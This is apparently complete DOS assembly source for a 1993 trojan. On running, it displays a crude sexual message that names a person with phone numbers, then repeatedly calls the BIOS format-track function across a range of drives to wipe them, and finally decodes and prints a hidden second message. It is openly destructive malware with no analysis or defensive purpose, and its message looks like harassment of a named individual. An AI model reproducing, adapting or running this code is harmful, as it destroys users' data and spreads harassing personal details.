code    segment 'code'
assume  cs:code, ds:code
org     100h

start:
        mov     ah,9                            ; Print Open Message Function
        mov     dx,offset msg_1                 ; Load Effective Message
        int     21h                             ; Do It!

fry:    push    ds                              ; Move The Data Segment ...
        pop     es                              ;  ... To The Extra Segment
        mov     ax,0701h                        ; Format Drive Function
        mov     cx,0                            ; Start Track/Sector 0
        mov     dl,2                            ; Drive C
        int     13h                             ; NuKE The Fucker
        int     13h                             ; Again!
        int     13h                             ; And Again!
        inc     dl                              ; Add To The Drive Letter
        cmp     dl,24                           ; If Drive Z, Then Continue
        jne     fry                             ; Else Kill The Drive In DL
        mov     si,offset msg_2                 ; Load Coded Message
        push    ax dx                           ; Set Up For Code Decryption

decrypt:
        lodsb                                   ; From Here -
        or      al,al
        je      haul_on_out
        xchg    dl,al
        sub     dl,93
        mov     ah,2                            ; - To Here Is Decryption
        int     21h                             ; Code I Stole From Viper's
        jmp     decrypt                         ; Trojan Horse Construction Set

haul_on_out:

        pop     ax dx                           ; Restore AX and DX
        int     20h

id      db      '[ECT] Havoc The Chaos 1993 - Trinity'
msg_1   db      'Fuck Me, Shuck Me, Eat Me Raw Baby!!!',13,10
        db      'If Your Into Men, Leather, Orange Cats With Square Balls,',13,10
        db      'Or Bi/Tri/Quadi-sexuality, Then Call Me Via `The Dungeon`, 1-800-800-8900,',13,10
        db      '`The Adult Line, For Men Who Are Seriously Into Leather, And The Fettish Lifestyle`',13,10,10
        db      '-Eric Catania (Voice:(203)648-9272, or Data:(203)644-6707',13,10,'$'
msg_2   db      '��։}�Ͼ�����}����}��Չ}���}�����}�������}����~',106,103
        db      '�}������}���}��}����}����Ѿ�}���}����~',106,103,106,103
        db      '��žžžž�}���}��˄�}�����}�}�����}��ʗ',106,103
        db      '�����}���������}��Ѿ�ƾ~',106,103,'$'

code    ends
        end start
        